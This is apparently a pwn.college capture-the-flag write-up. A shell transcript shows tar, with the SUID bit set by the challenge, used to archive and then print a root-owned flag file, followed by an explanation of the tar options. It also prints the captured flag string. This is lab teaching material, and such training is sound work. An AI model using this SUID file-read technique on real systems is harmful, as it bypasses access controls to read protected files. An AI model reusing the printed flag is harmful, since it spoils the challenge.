```bash
hacker@program-misuse-level-20:~$ cd /
hacker@program-misuse-level-20:/$ ls
bin  boot  challenge  dev  etc  flag  home  lib  lib32  lib64  libx32  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var
hacker@program-misuse-level-20:/$ cd challenge/
hacker@program-misuse-level-20:/challenge$ ls
babysuid_level20
hacker@program-misuse-level-20:/challenge$ ./babysuid_level20 
Welcome to ./babysuid_level20!

This challenge is part of a series of programs that
force you to understand different archive formats.

I just set the SUID bit on /usr/bin/tar.
Try to use it to read the flag!

IMPORTANT: make sure to run me (./babysuid_level20) every time that you restart
this challenge container to make sure that I set the SUID bit on /usr/bin/tar!
hacker@program-misuse-level-20:/challenge$ cd ..
hacker@program-misuse-level-20:/$ tar flag 
tar: Old option 'f' requires an argument.
Try 'tar --help' or 'tar --usage' for more information.
hacker@program-misuse-level-20:/$ tar -cf flag.tar flag
hacker@program-misuse-level-20:/$ ls
bin  boot  challenge  dev  etc  flag  flag.tar  home  lib  lib32  lib64  libx32  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var
hacker@program-misuse-level-20:/$ tar -xf -O flag.tar 
tar: -O: Cannot open: No such file or directory
tar: Error is not recoverable: exiting now
hacker@program-misuse-level-20:/$ tar -xO flag.tar 
tar: Refusing to read archive contents from terminal (missing -f option?)
tar: Error is not recoverable: exiting now
hacker@program-misuse-level-20:/$ tar -xOf flag.tar 
pwn.college{c974IkAx0h8RNMsgMpnegS6zTOu.0lM2EDL0AjNzQzW}
hacker@program-misuse-level-20:/$ tar -x -O -f flag.tar 
pwn.college{c974IkAx0h8RNMsgMpnegS6zTOu.0lM2EDL0AjNzQzW}
```

Here, after compressing the `flag` file, we get the `flag.tar` file.

Then to print the contents of the flag.tar to the standard output, we write this command

`tar -x -O -f flag.tar`

Here `-x` means extracting, `-O` means print the output, and `-f` specifies the tar file. `-f` tells `tar` that the next argument provided is the name of the archive file.

You can use the three options together if you want.

`tar -xOf flag.tar`
